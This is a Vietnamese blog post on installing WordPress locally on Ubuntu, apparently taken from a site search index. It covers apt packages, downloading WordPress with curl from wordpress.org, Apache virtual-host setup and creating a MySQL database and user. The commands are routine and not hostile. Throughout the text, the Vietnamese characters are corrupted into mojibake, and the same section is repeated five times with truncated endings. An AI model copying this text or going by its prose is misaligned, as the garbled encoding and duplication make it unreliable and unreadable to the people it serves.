m·∫∑c ƒë·ªãnh c·ªßa Apache/Nginx ƒë·ªÉ ch·∫°y web server # Khi Apache/NGINX kh·ªüi ƒë·ªông, n√≥ kh√¥ng ch·∫°y b·∫±ng root (nguy hi·ªÉm v√¨ c√≥ to√†n quy·ªÅn h·ªá th·ªëng), m√† s·∫Ω drop xu·ªëng ch·∫°y d∆∞·ªõi quy·ªÅn www-data. sudo chown www-data: /srv/www # T·∫£i g√≥i WordPress m·ªõi nh·∫•t t·ª´ trang ch√≠nh th·ª©c # Gi·∫£i n√©n vao th∆∞c m·ª•c /srv/www ƒë∆∞·ª£c t·∫°o ·ªü tr√™n curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www C√≥ th·ªÉ t·∫£i phi√™n b·∫£n c·ª• th·ªÉ b·∫±ng: curl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www C√†i t·ª´ wordpress.org l√† c√°ch chu·∫©n nh·∫•t v√† √≠t r·ªßi ro: Ubuntu c√≥ s·∫µn package wordpress trong repo. Nh∆∞ng n√≥ th∆∞·ªùng c≈© h∆°n nhi·ªÅu so v·ªõi b·∫£n ch√≠nh th·ª©c tr√™n wordpress.org C·ªông ƒë·ªìng WordPress ch·ªâ h·ªó tr·ª£ khi b·∫°n d√πng b·∫£n ch√≠nh th·ª©c t·ª´ wordpress.org, v√¨ n·∫øu b·∫°n g·∫∑p l·ªói do package c·ªßa Ubuntu th√¨ h·ªç kh√¥ng gi·∫£i quy·∫øt ƒë∆∞·ª£c. {: .prompt-info } Configure Apache for WordPress\rT·∫°o file /etc/apache2/sites-available/wordpress.conf c·∫•u h√¨nh Apache cho WordPress: # L·∫Øng nghe tr√™n t·∫•t c·∫£ ƒë·ªãa ch·ªâ IP (*) t·∫°i port 80 (HTTP). # Th∆∞ m·ª•c g·ªëc c·ªßa website (n∆°i ch·ª©a m√£ ngu·ªìn WordPress). DocumentRoot /srv/www/wordpress Options FollowSymLinks # Cho ph√©p file .htaccess ghi ƒë√® m·ªôt s·ªë thi·∫øt l·∫≠p li√™n quan ƒë·∫øn b·∫£o m·∫≠t v√† URL rewriting. AllowOverride Limit Options FileInfo # Khi truy c·∫≠p th∆∞ m·ª•c, Apache s·∫Ω t√¨m file index.php ƒë·ªÉ hi·ªÉn th·ªã. DirectoryIndex index.php # Cho ph√©p t·∫•t c·∫£ m·ªçi ng∆∞·ªùi truy c·∫≠p (c·∫ßn cho website public). Require all granted # Ri√™ng th∆∞ m·ª•c wp-content (ch·ª©a plugin, theme, upload) c≈©ng cho ph√©p truy c·∫≠p. Options FollowSymLinks Require all granted K√≠ch ho·∫°t site WordPress: sudo a2ensite wordpress a2ensite = enable site config (t·∫°o symlink t·ª´ /etc/apache2/sites-available/wordpress.conf sang /etc/apache2/sites-enabled/) Sau ƒë√≥ site wordpress s·∫Ω ƒë∆∞·ª£c Apache load khi restart. K√≠ch ho·∫°t module rewrite: sudo a2enmod rewrite WordPress c·∫ßn module mod_rewrite ƒë·ªÉ h·ªó tr·ª£ Pretty Permalinks (v√≠ d·ª• /blog/hello-world/ thay v√¨ ?p=123) V√¥ hi·ªáu h√≥a site m·∫∑c ƒë·ªãnh (Option): sudo a2dissite 000-default Apache m·∫∑c ƒë·ªãnh c√≥ site 000-default.conf (ch·ªâ hi·ªÉn th·ªã ‚ÄúIt works!‚Äù) N·∫øu kh√¥ng disable, site m·∫∑c ƒë·ªãnh c√≥ th·ªÉ chi·∫øm port 80 tr∆∞·ªõc WordPress üëâ Ho·∫∑c n·∫øu kh√¥ng mu·ªën disable, c√≥ th·ªÉ th√™m ServerName v√†o VirtualHost WordPress ƒë·ªÉ Apache ph√¢n bi·ªát domain. ServerName mywordpress.local DocumentRoot /srv/www/wordpress ... Mu·ªën ch·∫°y ƒë∆∞·ª£c th√¨ ph·∫£i c·∫•u h√¨nh DNS ho·∫∑c s·ª≠a file hosts: Linux/Mac: /etc/hosts Windows: C:\\Windows\\System32\\drivers\\etc\\hosts Reload Apache: sudo service apache2 reload T·∫£i l·∫°i c·∫•u h√¨nh m·ªõi m√† kh√¥ng c·∫ßn d·ª´ng server Configure database\rWordPress c·∫ßn m·ªôt c∆° s·ªü d·ªØ li·ªáu (MySQL/MariaDB) ƒë·ªÉ l∆∞u: B√†i vi·∫øt, trang, menu Ng∆∞·ªùi d√πng, m·∫≠t kh·∫©u (hash) C·∫•u h√¨nh site Plugins, themes settings M·ªü MySQL v·ªõi quy·ªÅn root: sudo mysql -u root C·∫•u h√¨nh MySQL: -- T·∫°o database wordpress mysql\u003e CREATE DATABASE wordpress; Query OK, 1 row affected (0,00 sec) -- T·∫°o user ri√™ng cho wordpress mysql\u003e CREATE USER wordpress@localhost IDENTIFIED BY ''; Query OK, 1 row affected (0,00 sec) -- C·∫•p quy·ªÅn cho user WordPress mysql\u003e GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER ON wordpress.* TO wordpress@localhost; Query OK, 1 row affected (0,00 sec) -- L√†m m·ªõi l·∫°i quy·ªÅn mysql\u003e FLUSH PRIVILEGES; Query OK, 1 row affected (0,00 sec) -- Tho√°t mysql\u003e quit Bye Kh·ªüi ƒë·ªông l·∫°i d·ªãch v·ª•: sudo service mysql start Configure WordP","date":"2025-08-21","objectID":"/vi/posts/2025-08-21-wordpress-local-and-debugging/:3:1","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/vi/posts/2025-08-21-wordpress-local-and-debugging/#install-wordpress"},{"categories":["Web"],"collections":null,"content":"Install and configure WordPress\rInstall Dependencies\rC√†i to√†n b·ªô stack c·∫ßn thi·∫øt ƒë·ªÉ ch·∫°y WordPress (web server + database + PHP + c√°c extension quan tr·ªçng). sudo apt install apache2 \\ ghostscript \\ libapache2-mod-php \\ mysql-server \\ php \\ php-bcmath \\ php-curl \\ php-imagick \\ php-intl \\ php-json \\ php-mbstring \\ php-mysql \\ php-xml \\ php-zip Install WordPress\rT·∫£i v√† c√†i m√£ ngu·ªìn WordPress v√†o th∆∞ m·ª•c web. # T·∫°o folder ƒë·ªÉ l∆∞u tr·ªØ m√£ ngu·ªìn website sudo mkdir -p /srv/www # ƒê·ªïi owner th√†nh www-data, ƒë√¢y l√† user m·∫∑c ƒë·ªãnh c·ªßa Apache/Nginx ƒë·ªÉ ch·∫°y web server # Khi Apache/NGINX kh·ªüi ƒë·ªông, n√≥ kh√¥ng ch·∫°y b·∫±ng root (nguy hi·ªÉm v√¨ c√≥ to√†n quy·ªÅn h·ªá th·ªëng), m√† s·∫Ω drop xu·ªëng ch·∫°y d∆∞·ªõi quy·ªÅn www-data. sudo chown www-data: /srv/www # T·∫£i g√≥i WordPress m·ªõi nh·∫•t t·ª´ trang ch√≠nh th·ª©c # Gi·∫£i n√©n vao th∆∞c m·ª•c /srv/www ƒë∆∞·ª£c t·∫°o ·ªü tr√™n curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www C√≥ th·ªÉ t·∫£i phi√™n b·∫£n c·ª• th·ªÉ b·∫±ng: curl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www C√†i t·ª´ wordpress.org l√† c√°ch chu·∫©n nh·∫•t v√† √≠t r·ªßi ro: Ubuntu c√≥ s·∫µn package wordpress trong repo. Nh∆∞ng n√≥ th∆∞·ªùng c≈© h∆°n nhi·ªÅu so v·ªõi b·∫£n ch√≠nh th·ª©c tr√™n wordpress.org C·ªông ƒë·ªìng WordPress ch·ªâ h·ªó tr·ª£ khi b·∫°n d√πng b·∫£n ch√≠nh th·ª©c t·ª´ wordpress.org, v√¨ n·∫øu b·∫°n g·∫∑p l·ªói do package c·ªßa Ubuntu th√¨ h·ªç kh√¥ng gi·∫£i quy·∫øt ƒë∆∞·ª£c. {: .prompt-info } Configure Apache for WordPress\rT·∫°o file /etc/apache2/sites-available/wordpress.conf c·∫•u h√¨nh Apache cho WordPress: # L·∫Øng nghe tr√™n t·∫•t c·∫£ ƒë·ªãa ch·ªâ IP (*) t·∫°i port 80 (HTTP). # Th∆∞ m·ª•c g·ªëc c·ªßa website (n∆°i ch·ª©a m√£ ngu·ªìn WordPress). DocumentRoot /srv/www/wordpress Options FollowSymLinks # Cho ph√©p file .htaccess ghi ƒë√® m·ªôt s·ªë thi·∫øt l·∫≠p li√™n quan ƒë·∫øn b·∫£o m·∫≠t v√† URL rewriting. AllowOverride Limit Options FileInfo # Khi truy c·∫≠p th∆∞ m·ª•c, Apache s·∫Ω t√¨m file index.php ƒë·ªÉ hi·ªÉn th·ªã. DirectoryIndex index.php # Cho ph√©p t·∫•t c·∫£ m·ªçi ng∆∞·ªùi truy c·∫≠p (c·∫ßn cho website public). Require all granted # Ri√™ng th∆∞ m·ª•c wp-content (ch·ª©a plugin, theme, upload) c≈©ng cho ph√©p truy c·∫≠p. Options FollowSymLinks Require all granted K√≠ch ho·∫°t site WordPress: sudo a2ensite wordpress a2ensite = enable site config (t·∫°o symlink t·ª´ /etc/apache2/sites-available/wordpress.conf sang /etc/apache2/sites-enabled/) Sau ƒë√≥ site wordpress s·∫Ω ƒë∆∞·ª£c Apache load khi restart. K√≠ch ho·∫°t module rewrite: sudo a2enmod rewrite WordPress c·∫ßn module mod_rewrite ƒë·ªÉ h·ªó tr·ª£ Pretty Permalinks (v√≠ d·ª• /blog/hello-world/ thay v√¨ ?p=123) V√¥ hi·ªáu h√≥a site m·∫∑c ƒë·ªãnh (Option): sudo a2dissite 000-default Apache m·∫∑c ƒë·ªãnh c√≥ site 000-default.conf (ch·ªâ hi·ªÉn th·ªã ‚ÄúIt works!‚Äù) N·∫øu kh√¥ng disable, site m·∫∑c ƒë·ªãnh c√≥ th·ªÉ chi·∫øm port 80 tr∆∞·ªõc WordPress üëâ Ho·∫∑c n·∫øu kh√¥ng mu·ªën disable, c√≥ th·ªÉ th√™m ServerName v√†o VirtualHost WordPress ƒë·ªÉ Apache ph√¢n bi·ªát domain. ServerName mywordpress.local DocumentRoot /srv/www/wordpress ... Mu·ªën ch·∫°y ƒë∆∞·ª£c th√¨ ph·∫£i c·∫•u h√¨nh DNS ho·∫∑c s·ª≠a file hosts: Linux/Mac: /etc/hosts Windows: C:\\Windows\\System32\\drivers\\etc\\hosts Reload Apache: sudo service apache2 reload T·∫£i l·∫°i c·∫•u h√¨nh m·ªõi m√† kh√¥ng c·∫ßn d·ª´ng server Configure database\rWordPress c·∫ßn m·ªôt c∆° s·ªü d·ªØ li·ªáu (MySQL/MariaDB) ƒë·ªÉ l∆∞u: B√†i vi·∫øt, trang, menu Ng∆∞·ªùi d√πng, m·∫≠t kh·∫©u (hash) C·∫•u h√¨nh site Plugins, themes settings M·ªü MySQL v·ªõi quy·ªÅn root: sudo mysql -u root C·∫•u h√¨nh MySQL: -- T·∫°o database wordpress mysql\u003e CREATE DATABASE wordpress; Query OK, 1 row affected (0,00 sec) -- T·∫°o user ri√™ng cho wordpress mysql\u003e CREATE USER wordpress@localhost IDENTIFIED BY ''; Query OK, 1 row affected (0,00 sec) -- C·∫•p quy·ªÅn cho user WordPress mysql\u003e GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER ON wordpress.* TO wordpress@localhost; Query OK, 1 row affected (0,00 sec) -- L√†m m·ªõi l·∫°i quy·ªÅn mysql\u003e FLUSH PRIVILEGES; Query OK, 1 row affected (0,00 sec) -- Tho√°t mysql\u003e quit Bye Kh·ªüi ƒë·ªông l·∫°i d·ªãch v·ª•: sudo service mysql start Configure WordP","date":"2025-08-21","objectID":"/vi/posts/2025-08-21-wordpress-local-and-debugging/:3:1","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/vi/posts/2025-08-21-wordpress-local-and-debugging/#configure-apache-for-wordpress"},{"categories":["Web"],"collections":null,"content":"Install and configure WordPress\rInstall Dependencies\rC√†i to√†n b·ªô stack c·∫ßn thi·∫øt ƒë·ªÉ ch·∫°y WordPress (web server + database + PHP + c√°c extension quan tr·ªçng). sudo apt install apache2 \\ ghostscript \\ libapache2-mod-php \\ mysql-server \\ php \\ php-bcmath \\ php-curl \\ php-imagick \\ php-intl \\ php-json \\ php-mbstring \\ php-mysql \\ php-xml \\ php-zip Install WordPress\rT·∫£i v√† c√†i m√£ ngu·ªìn WordPress v√†o th∆∞ m·ª•c web. # T·∫°o folder ƒë·ªÉ l∆∞u tr·ªØ m√£ ngu·ªìn website sudo mkdir -p /srv/www # ƒê·ªïi owner th√†nh www-data, ƒë√¢y l√† user m·∫∑c ƒë·ªãnh c·ªßa Apache/Nginx ƒë·ªÉ ch·∫°y web server # Khi Apache/NGINX kh·ªüi ƒë·ªông, n√≥ kh√¥ng ch·∫°y b·∫±ng root (nguy hi·ªÉm v√¨ c√≥ to√†n quy·ªÅn h·ªá th·ªëng), m√† s·∫Ω drop xu·ªëng ch·∫°y d∆∞·ªõi quy·ªÅn www-data. sudo chown www-data: /srv/www # T·∫£i g√≥i WordPress m·ªõi nh·∫•t t·ª´ trang ch√≠nh th·ª©c # Gi·∫£i n√©n vao th∆∞c m·ª•c /srv/www ƒë∆∞·ª£c t·∫°o ·ªü tr√™n curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www C√≥ th·ªÉ t·∫£i phi√™n b·∫£n c·ª• th·ªÉ b·∫±ng: curl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www C√†i t·ª´ wordpress.org l√† c√°ch chu·∫©n nh·∫•t v√† √≠t r·ªßi ro: Ubuntu c√≥ s·∫µn package wordpress trong repo. Nh∆∞ng n√≥ th∆∞·ªùng c≈© h∆°n nhi·ªÅu so v·ªõi b·∫£n ch√≠nh th·ª©c tr√™n wordpress.org C·ªông ƒë·ªìng WordPress ch·ªâ h·ªó tr·ª£ khi b·∫°n d√πng b·∫£n ch√≠nh th·ª©c t·ª´ wordpress.org, v√¨ n·∫øu b·∫°n g·∫∑p l·ªói do package c·ªßa Ubuntu th√¨ h·ªç kh√¥ng gi·∫£i quy·∫øt ƒë∆∞·ª£c. {: .prompt-info } Configure Apache for WordPress\rT·∫°o file /etc/apache2/sites-available/wordpress.conf c·∫•u h√¨nh Apache cho WordPress: # L·∫Øng nghe tr√™n t·∫•t c·∫£ ƒë·ªãa ch·ªâ IP (*) t·∫°i port 80 (HTTP). # Th∆∞ m·ª•c g·ªëc c·ªßa website (n∆°i ch·ª©a m√£ ngu·ªìn WordPress). DocumentRoot /srv/www/wordpress Options FollowSymLinks # Cho ph√©p file .htaccess ghi ƒë√® m·ªôt s·ªë thi·∫øt l·∫≠p li√™n quan ƒë·∫øn b·∫£o m·∫≠t v√† URL rewriting. AllowOverride Limit Options FileInfo # Khi truy c·∫≠p th∆∞ m·ª•c, Apache s·∫Ω t√¨m file index.php ƒë·ªÉ hi·ªÉn th·ªã. DirectoryIndex index.php # Cho ph√©p t·∫•t c·∫£ m·ªçi ng∆∞·ªùi truy c·∫≠p (c·∫ßn cho website public). Require all granted # Ri√™ng th∆∞ m·ª•c wp-content (ch·ª©a plugin, theme, upload) c≈©ng cho ph√©p truy c·∫≠p. Options FollowSymLinks Require all granted K√≠ch ho·∫°t site WordPress: sudo a2ensite wordpress a2ensite = enable site config (t·∫°o symlink t·ª´ /etc/apache2/sites-available/wordpress.conf sang /etc/apache2/sites-enabled/) Sau ƒë√≥ site wordpress s·∫Ω ƒë∆∞·ª£c Apache load khi restart. K√≠ch ho·∫°t module rewrite: sudo a2enmod rewrite WordPress c·∫ßn module mod_rewrite ƒë·ªÉ h·ªó tr·ª£ Pretty Permalinks (v√≠ d·ª• /blog/hello-world/ thay v√¨ ?p=123) V√¥ hi·ªáu h√≥a site m·∫∑c ƒë·ªãnh (Option): sudo a2dissite 000-default Apache m·∫∑c ƒë·ªãnh c√≥ site 000-default.conf (ch·ªâ hi·ªÉn th·ªã ‚ÄúIt works!‚Äù) N·∫øu kh√¥ng disable, site m·∫∑c ƒë·ªãnh c√≥ th·ªÉ chi·∫øm port 80 tr∆∞·ªõc WordPress üëâ Ho·∫∑c n·∫øu kh√¥ng mu·ªën disable, c√≥ th·ªÉ th√™m ServerName v√†o VirtualHost WordPress ƒë·ªÉ Apache ph√¢n bi·ªát domain. ServerName mywordpress.local DocumentRoot /srv/www/wordpress ... Mu·ªën ch·∫°y ƒë∆∞·ª£c th√¨ ph·∫£i c·∫•u h√¨nh DNS ho·∫∑c s·ª≠a file hosts: Linux/Mac: /etc/hosts Windows: C:\\Windows\\System32\\drivers\\etc\\hosts Reload Apache: sudo service apache2 reload T·∫£i l·∫°i c·∫•u h√¨nh m·ªõi m√† kh√¥ng c·∫ßn d·ª´ng server Configure database\rWordPress c·∫ßn m·ªôt c∆° s·ªü d·ªØ li·ªáu (MySQL/MariaDB) ƒë·ªÉ l∆∞u: B√†i vi·∫øt, trang, menu Ng∆∞·ªùi d√πng, m·∫≠t kh·∫©u (hash) C·∫•u h√¨nh site Plugins, themes settings M·ªü MySQL v·ªõi quy·ªÅn root: sudo mysql -u root C·∫•u h√¨nh MySQL: -- T·∫°o database wordpress mysql\u003e CREATE DATABASE wordpress; Query OK, 1 row affected (0,00 sec) -- T·∫°o user ri√™ng cho wordpress mysql\u003e CREATE USER wordpress@localhost IDENTIFIED BY ''; Query OK, 1 row affected (0,00 sec) -- C·∫•p quy·ªÅn cho user WordPress mysql\u003e GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER ON wordpress.* TO wordpress@localhost; Query OK, 1 row affected (0,00 sec) -- L√†m m·ªõi l·∫°i quy·ªÅn mysql\u003e FLUSH PRIVILEGES; Query OK, 1 row affected (0,00 sec) -- Tho√°t mysql\u003e quit Bye Kh·ªüi ƒë·ªông l·∫°i d·ªãch v·ª•: sudo service mysql start Configure WordP","date":"2025-08-21","objectID":"/vi/posts/2025-08-21-wordpress-local-and-debugging/:3:1","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/vi/posts/2025-08-21-wordpress-local-and-debugging/#configure-database"},{"categories":["Web"],"collections":null,"content":"Install and configure WordPress\rInstall Dependencies\rC√†i to√†n b·ªô stack c·∫ßn thi·∫øt ƒë·ªÉ ch·∫°y WordPress (web server + database + PHP + c√°c extension quan tr·ªçng). sudo apt install apache2 \\ ghostscript \\ libapache2-mod-php \\ mysql-server \\ php \\ php-bcmath \\ php-curl \\ php-imagick \\ php-intl \\ php-json \\ php-mbstring \\ php-mysql \\ php-xml \\ php-zip Install WordPress\rT·∫£i v√† c√†i m√£ ngu·ªìn WordPress v√†o th∆∞ m·ª•c web. # T·∫°o folder ƒë·ªÉ l∆∞u tr·ªØ m√£ ngu·ªìn website sudo mkdir -p /srv/www # ƒê·ªïi owner th√†nh www-data, ƒë√¢y l√† user m·∫∑c ƒë·ªãnh c·ªßa Apache/Nginx ƒë·ªÉ ch·∫°y web server # Khi Apache/NGINX kh·ªüi ƒë·ªông, n√≥ kh√¥ng ch·∫°y b·∫±ng root (nguy hi·ªÉm v√¨ c√≥ to√†n quy·ªÅn h·ªá th·ªëng), m√† s·∫Ω drop xu·ªëng ch·∫°y d∆∞·ªõi quy·ªÅn www-data. sudo chown www-data: /srv/www # T·∫£i g√≥i WordPress m·ªõi nh·∫•t t·ª´ trang ch√≠nh th·ª©c # Gi·∫£i n√©n vao th∆∞c m·ª•c /srv/www ƒë∆∞·ª£c t·∫°o ·ªü tr√™n curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www C√≥ th·ªÉ t·∫£i phi√™n b·∫£n c·ª• th·ªÉ b·∫±ng: curl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www C√†i t·ª´ wordpress.org l√† c√°ch chu·∫©n nh·∫•t v√† √≠t r·ªßi ro: Ubuntu c√≥ s·∫µn package wordpress trong repo. Nh∆∞ng n√≥ th∆∞·ªùng c≈© h∆°n nhi·ªÅu so v·ªõi b·∫£n ch√≠nh th·ª©c tr√™n wordpress.org C·ªông ƒë·ªìng WordPress ch·ªâ h·ªó tr·ª£ khi b·∫°n d√πng b·∫£n ch√≠nh th·ª©c t·ª´ wordpress.org, v√¨ n·∫øu b·∫°n g·∫∑p l·ªói do package c·ªßa Ubuntu th√¨ h·ªç kh√¥ng gi·∫£i quy·∫øt ƒë∆∞·ª£c. {: .prompt-info } Configure Apache for WordPress\rT·∫°o file /etc/apache2/sites-available/wordpress.conf c·∫•u h√¨nh Apache cho WordPress: # L·∫Øng nghe tr√™n t·∫•t c·∫£ ƒë·ªãa ch·ªâ IP (*) t·∫°i port 80 (HTTP). # Th∆∞ m·ª•c g·ªëc c·ªßa website (n∆°i ch·ª©a m√£ ngu·ªìn WordPress). DocumentRoot /srv/www/wordpress Options FollowSymLinks # Cho ph√©p file .htaccess ghi ƒë√® m·ªôt s·ªë thi·∫øt l·∫≠p li√™n quan ƒë·∫øn b·∫£o m·∫≠t v√† URL rewriting. AllowOverride Limit Options FileInfo # Khi truy c·∫≠p th∆∞ m·ª•c, Apache s·∫Ω t√¨m file index.php ƒë·ªÉ hi·ªÉn th·ªã. DirectoryIndex index.php # Cho ph√©p t·∫•t c·∫£ m·ªçi ng∆∞·ªùi truy c·∫≠p (c·∫ßn cho website public). Require all granted # Ri√™ng th∆∞ m·ª•c wp-content (ch·ª©a plugin, theme, upload) c≈©ng cho ph√©p truy c·∫≠p. Options FollowSymLinks Require all granted K√≠ch ho·∫°t site WordPress: sudo a2ensite wordpress a2ensite = enable site config (t·∫°o symlink t·ª´ /etc/apache2/sites-available/wordpress.conf sang /etc/apache2/sites-enabled/) Sau ƒë√≥ site wordpress s·∫Ω ƒë∆∞·ª£c Apache load khi restart. K√≠ch ho·∫°t module rewrite: sudo a2enmod rewrite WordPress c·∫ßn module mod_rewrite ƒë·ªÉ h·ªó tr·ª£ Pretty Permalinks (v√≠ d·ª• /blog/hello-world/ thay v√¨ ?p=123) V√¥ hi·ªáu h√≥a site m·∫∑c ƒë·ªãnh (Option): sudo a2dissite 000-default Apache m·∫∑c ƒë·ªãnh c√≥ site 000-default.conf (ch·ªâ hi·ªÉn th·ªã ‚ÄúIt works!‚Äù) N·∫øu kh√¥ng disable, site m·∫∑c ƒë·ªãnh c√≥ th·ªÉ chi·∫øm port 80 tr∆∞·ªõc WordPress üëâ Ho·∫∑c n·∫øu kh√¥ng mu·ªën disable, c√≥ th·ªÉ th√™m ServerName v√†o VirtualHost WordPress ƒë·ªÉ Apache ph√¢n bi·ªát domain. ServerName mywordpress.local DocumentRoot /srv/www/wordpress ... Mu·ªën ch·∫°y ƒë∆∞·ª£c th√¨ ph·∫£i c·∫•u h√¨nh DNS ho·∫∑c s·ª≠a file hosts: Linux/Mac: /etc/hosts Windows: C:\\Windows\\System32\\drivers\\etc\\hosts Reload Apache: sudo service apache2 reload T·∫£i l·∫°i c·∫•u h√¨nh m·ªõi m√† kh√¥ng c·∫ßn d·ª´ng server Configure database\rWordPress c·∫ßn m·ªôt c∆° s·ªü d·ªØ li·ªáu (MySQL/MariaDB) ƒë·ªÉ l∆∞u: B√†i vi·∫øt, trang, menu Ng∆∞·ªùi d√πng, m·∫≠t kh·∫©u (hash) C·∫•u h√¨nh site Plugins, themes settings M·ªü MySQL v·ªõi quy·ªÅn root: sudo mysql -u root C·∫•u h√¨nh MySQL: -- T·∫°o database wordpress mysql\u003e CREATE DATABASE wordpress; Query OK, 1 row affected (0,00 sec) -- T·∫°o user ri√™ng cho wordpress mysql\u003e CREATE USER wordpress@localhost IDENTIFIED BY ''; Query OK, 1 row affected (0,00 sec) -- C·∫•p quy·ªÅn cho user WordPress mysql\u003e GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER ON wordpress.* TO wordpress@localhost; Query OK, 1 row affected (0,00 sec) -- L√†m m·ªõi l·∫°i quy·ªÅn mysql\u003e FLUSH PRIVILEGES; Query OK, 1 row affected (0,00 sec) -- Tho√°t mysql\u003e quit Bye Kh·ªüi ƒë·ªông l·∫°i d·ªãch v·ª•: sudo service mysql start Configure WordP","date":"2025-08-21","objectID":"/vi/posts/2025-08-21-wordpress-local-and-debugging/:3:1","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/vi/posts/2025-08-21-wordpress-local-and-debugging/#configure-wordpress-to-connect-to-the-database"},{"categories":["Web"],"collections":null,"content":"Install and configure WordPress\rInstall Dependencies\rC√†i to√†n b·ªô stack c·∫ßn thi·∫øt ƒë·ªÉ ch·∫°y WordPress (web server + database + PHP + c√°c extension quan tr·ªçng). sudo apt install apache2 \\ ghostscript \\ libapache2-mod-php \\ mysql-server \\ php \\ php-bcmath \\ php-curl \\ php-imagick \\ php-intl \\ php-json \\ php-mbstring \\ php-mysql \\ php-xml \\ php-zip Install WordPress\rT·∫£i v√† c√†i m√£ ngu·ªìn WordPress v√†o th∆∞ m·ª•c web. # T·∫°o folder ƒë·ªÉ l∆∞u tr·ªØ m√£ ngu·ªìn website sudo mkdir -p /srv/www # ƒê·ªïi owner th√†nh www-data, ƒë√¢y l√† user m·∫∑c ƒë·ªãnh c·ªßa Apache/Nginx ƒë·ªÉ ch·∫°y web server # Khi Apache/NGINX kh·ªüi ƒë·ªông, n√≥ kh√¥ng ch·∫°y b·∫±ng root (nguy hi·ªÉm v√¨ c√≥ to√†n quy·ªÅn h·ªá th·ªëng), m√† s·∫Ω drop xu·ªëng ch·∫°y d∆∞·ªõi quy·ªÅn www-data. sudo chown www-data: /srv/www # T·∫£i g√≥i WordPress m·ªõi nh·∫•t t·ª´ trang ch√≠nh th·ª©c # Gi·∫£i n√©n vao th∆∞c m·ª•c /srv/www ƒë∆∞·ª£c t·∫°o ·ªü tr√™n curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www C√≥ th·ªÉ t·∫£i phi√™n b·∫£n c·ª• th·ªÉ b·∫±ng: curl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www C√†i t·ª´ wordpress.org l√† c√°ch chu·∫©n nh·∫•t v√† √≠t r·ªßi ro: Ubuntu c√≥ s·∫µn package wordpress trong repo. Nh∆∞ng n√≥ th∆∞·ªùng c≈© h∆°n nhi·ªÅu so v·ªõi b·∫£n ch√≠nh th·ª©c tr√™n wordpress.org C·ªông ƒë·ªìng WordPress ch·ªâ h·ªó tr·ª£ khi b·∫°n d√πng b·∫£n ch√≠nh th·ª©c t·ª´ wordpress.org, v√¨ n·∫øu b·∫°n g·∫∑p l·ªói do package c·ªßa Ubuntu th√¨ h·ªç kh√¥ng gi·∫£i quy·∫øt ƒë∆∞·ª£c. {: .prompt-info } Configure Apache for WordPress\rT·∫°o file /etc/apache2/sites-available/wordpress.conf c·∫•u h√¨nh Apache cho WordPress: # L·∫Øng nghe tr√™n t·∫•t c·∫£ ƒë·ªãa ch·ªâ IP (*) t·∫°i port 80 (HTTP). # Th∆∞ m·ª•c g·ªëc c·ªßa website (n∆°i ch·ª©a m√£ ngu·ªìn WordPress). DocumentRoot /srv/www/wordpress Options FollowSymLinks # Cho ph√©p file .htaccess ghi ƒë√® m·ªôt s·ªë thi·∫øt l·∫≠p li√™n quan ƒë·∫øn b·∫£o m·∫≠t v√† URL rewriting. AllowOverride Limit Options FileInfo # Khi truy c·∫≠p th∆∞ m·ª•c, Apache s·∫Ω t√¨m file index.php ƒë·ªÉ hi·ªÉn th·ªã. DirectoryIndex index.php # Cho ph√©p t·∫•t c·∫£ m·ªçi ng∆∞·ªùi truy c·∫≠p (c·∫ßn cho website public). Require all granted # Ri√™ng th∆∞ m·ª•c wp-content (ch·ª©a plugin, theme, upload) c≈©ng cho ph√©p truy c·∫≠p. Options FollowSymLinks Require all granted K√≠ch ho·∫°t site WordPress: sudo a2ensite wordpress a2ensite = enable site config (t·∫°o symlink t·ª´ /etc/apache2/sites-available/wordpress.conf sang /etc/apache2/sites-enabled/) Sau ƒë√≥ site wordpress s·∫Ω ƒë∆∞·ª£c Apache load khi restart. K√≠ch ho·∫°t module rewrite: sudo a2enmod rewrite WordPress c·∫ßn module mod_rewrite ƒë·ªÉ h·ªó tr·ª£ Pretty Permalinks (v√≠ d·ª• /blog/hello-world/ thay v√¨ ?p=123) V√¥ hi·ªáu h√≥a site m·∫∑c ƒë·ªãnh (Option): sudo a2dissite 000-default Apache m·∫∑c ƒë·ªãnh c√≥ site 000-default.conf (ch·ªâ hi·ªÉn th·ªã ‚ÄúIt works!‚Äù) N·∫øu kh√¥ng disable, site m·∫∑c ƒë·ªãnh c√≥ th·ªÉ chi·∫øm port 80 tr∆∞·ªõc WordPress üëâ Ho·∫∑c n·∫øu kh√¥ng mu·ªën disable, c√≥ th·ªÉ th√™m ServerName v√†o VirtualHost WordPress ƒë·ªÉ Apache ph√¢n bi·ªát domain. ServerName mywordpress.local DocumentRoot /srv/www/wordpress ... Mu·ªën ch·∫°y ƒë∆∞·ª£c th√¨ ph·∫£i c·∫•u h√¨nh DNS ho·∫∑c s·ª≠a file hosts: Linux/Mac: /etc/hosts Windows: C:\\Windows\\System32\\drivers\\etc\\hosts Reload Apache: sudo service apache2 reload T·∫£i l·∫°i c·∫•u h√¨nh m·ªõi m√† kh√¥ng c·∫ßn d·ª´ng server Configure database\rWordPress c·∫ßn m·ªôt c∆° s·ªü d·ªØ li·ªáu (MySQL/MariaDB) ƒë·ªÉ l∆∞u: B√†i vi·∫øt, trang, menu Ng∆∞·ªùi d√πng, m·∫≠t kh·∫©u (hash) C·∫•u h√¨nh site Plugins, themes settings M·ªü MySQL v·ªõi quy·ªÅn root: sudo mysql -u root C·∫•u h√¨nh MySQL: -- T·∫°o database wordpress mysql\u003e CREATE DATABASE wordpress; Query OK, 1 row 